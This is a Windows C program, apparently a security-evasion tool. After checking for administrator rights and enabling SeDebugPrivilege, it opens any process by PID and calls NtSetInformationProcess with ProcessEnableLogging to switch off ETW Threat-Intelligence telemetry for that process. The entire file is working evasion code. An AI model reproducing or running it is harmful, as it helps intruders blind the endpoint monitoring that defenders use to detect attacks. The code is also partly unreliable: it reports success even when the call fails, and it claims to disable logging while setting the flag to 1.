#include <Windows.h>
#include <stdio.h>
#include "ntdll.h"

//#pragma comment(lib, "ntdll")

NtSetInformationProcess_t NtSetInformationProcess;

BOOL IsProcessRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroupSid = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    // Allocate and initialize a SID for the Administrators group.
    if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroupSid)) {
        return FALSE;
    }

    // Check if the current process's token is a member of the Administrators group.
    if (!CheckTokenMembership(NULL, adminGroupSid, &isAdmin)) {
        isAdmin = FALSE;
    }

    // Free the SID when done.
    FreeSid(adminGroupSid);

    return isAdmin;
}

void CheckAdminPrivileges() {
    if (!IsProcessRunningAsAdmin()) {
        printf("Error: This process is not being run with administrative privileges.\n");
        exit(EXIT_FAILURE);
    }
}

BOOL SetDebugPrivilege() 
{
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    // Open a handle to the access token for the calling process.
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf("Failed to open process token. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Retrieve the locally unique identifier (LUID) used on a specified system to represent the name of the privilege.
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        printf("Failed to look up privilege value. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Enable the privilege or disable all privileges.
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("Failed to adjust token privileges. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("The token does not have the specified privilege. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

void inifunctions()
{
    LPCWSTR lpcszTarget = L"ntdll.dll";
    // Get a handle to ntdll.dll
    HMODULE hNtdll = GetModuleHandleW(lpcszTarget);

    NtSetInformationProcess = (NtSetInformationProcess_t)GetProcAddress(hNtdll, "NtSetInformationProcess");
}

int main(int argc, char* argv[])
{
    HANDLE processHandle;

    if (argc == 3 && strcmp(argv[1], "--process") == 0) {
        DWORD pid = atoi(argv[2]);
        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (processHandle == NULL) {
            printf("Failed to open process with PID %d. Error: %lu\n", pid, GetLastError());
            return 1;
        }
    }
    else if (argc == 2 && strcmp(argv[1], "--current") == 0) {
        processHandle = GetCurrentProcess();
    }
    else {
        printf("Usage: %s [--process <pid> | --current]\n", argv[0]);
        return 1;
    }

    CheckAdminPrivileges();
    if (!SetDebugPrivilege()) {
        printf("Failed to enable SeDebugPrivilege.\n");
        return 1;
    }
    inifunctions();
    printf("Press enter to disable ETWi logging for current process\n");
    getchar();
    PROCESS_LOGGING_INFORMATION procinfo;
    procinfo.Flags = 1;
    NTSTATUS status = NtSetInformationProcess(processHandle, ProcessEnableLogging, &procinfo, sizeof(PROCESS_LOGGING_INFORMATION));
    if (status != STATUS_SUCCESS)
    {
        printf("NtSetInformationProcess failed with %X\n", status);
    }
    printf("ETWi logging for current process disabled successfully!\n");
    getchar();
	return 0;
}